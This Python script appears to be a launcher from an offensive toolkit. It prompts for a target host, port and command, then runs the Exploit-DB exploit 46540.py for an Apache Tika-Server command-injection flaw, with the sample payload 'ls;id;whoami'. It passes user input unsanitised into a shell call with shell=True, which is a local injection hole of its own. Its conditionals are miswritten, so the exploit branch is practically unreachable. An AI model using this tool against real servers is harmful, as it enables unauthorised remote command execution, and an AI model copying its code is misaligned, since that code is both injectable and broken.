import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


while True:
    host = input(f"{Colors.red}(Apache Tika-Server < 1.18 Command Injection){Colors.end} [Enter Domain Without URI]:~#")
    port = int(input(f"{Colors.red}(Apache Tika-Server < 1.18 Command Injection){Colors.end} [Enter Server Port]:~#"))
    cmd = input(f"{Colors.red}(Apache Tika-Server < 1.18 Command Injection){Colors.end} [Enter Command]:~#")

    if host or port or cmd == "options":
        print("""
    Enter Domain Without URI: domain.com/whatever/cgi
    Enter Remote Port: 9000
    Enter Command: ls;id;whoami\n\n""")
    elif host or port or cmd == "back" or host or port or cmd == "exit":
        break
    else:
        sub.call(f"python /usr/share/exploitdb/exploits/windows/remote/46540.py {host} {port} {cmd}", shell=True)
        break
